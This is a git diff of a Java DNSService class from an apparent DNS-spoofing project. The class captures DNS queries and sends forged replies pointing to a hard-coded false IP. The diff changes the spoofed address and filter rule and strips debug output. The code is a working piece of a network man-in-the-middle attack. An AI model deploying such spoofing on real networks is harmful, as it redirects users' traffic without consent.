@@ -4,17 +4,13 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.ByteBuffer;
 
-import jpcap.JpcapSender;
 import jpcap.packet.UDPPacket;
 
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
-import org.bitducks.spoofing.core.rules.DNSQueryrule;
-import org.bitducks.spoofing.core.rules.DNSRule;
+import org.bitducks.spoofing.core.rules.DNSIpv4Rule;
 import org.bitducks.spoofing.packet.DNSPacket;
 import org.bitducks.spoofing.packet.PacketFactory;
-
-import sun.security.jca.JCAUtil;
 
 public class DNSService extends Service {
 	private InetAddress falseIpAddr = null;
@@ -22,13 +18,12 @@ public class DNSService extends Service {
 	public DNSService() {
 		
 		// TODO Add rule
-		this.getPolicy().addRule(new DNSRule());
-		this.getPolicy().addRule(new DNSQueryrule());
+		this.getPolicy().addRule(new DNSIpv4Rule());
 		
 		this.getPolicy().setStrict(true);
 		
 		// TODO Get our IP or the IP provided
-		this.setDNSFalseIp("192.168.2.136");
+		this.setDNSFalseIp("10.17.62.145");
 	}
 	
 	public void setDNSFalseIp(String falseHostIp) {
@@ -45,13 +40,11 @@ public class DNSService extends Service {
 		System.out.println("DNS Starting");
 		UDPPacket queryPaquet = null;
 		while ((queryPaquet = (UDPPacket)this.getNextPacket()) != null) {
+		//	System.out.println("got Packet");
 				
-				System.out.println("got dns paquet");
 				// Getting the query part of the packet
 				byte[] queryData = queryPaquet.data;
 				
-				System.out.println(queryData.length);
-				System.out.println(queryPaquet.toString());
 				ByteBuffer queryBuffer = ByteBuffer.allocate(queryData.length - 12);
 				for (int i = 12; i < queryData.length; ++i) {
 					queryBuffer.put(queryData[i]);
@@ -64,14 +57,14 @@ public class DNSService extends Service {
 						queryBuffer.array(), 
 						this.falseIpAddr);
 				
-				System.out.println("answer " + answerPaquet);
 				this.sendDNSPacket(answerPaquet);
 				
-		}		
+		}
 	}
 	
 	private void sendDNSPacket(DNSPacket packet) {
-		System.out.println("Sending Dns");
+	//	System.out.println("Sending Dns");
+	//	System.out.println("-----");
 		Server.getInstance().sendPacket(packet);
 	}
 
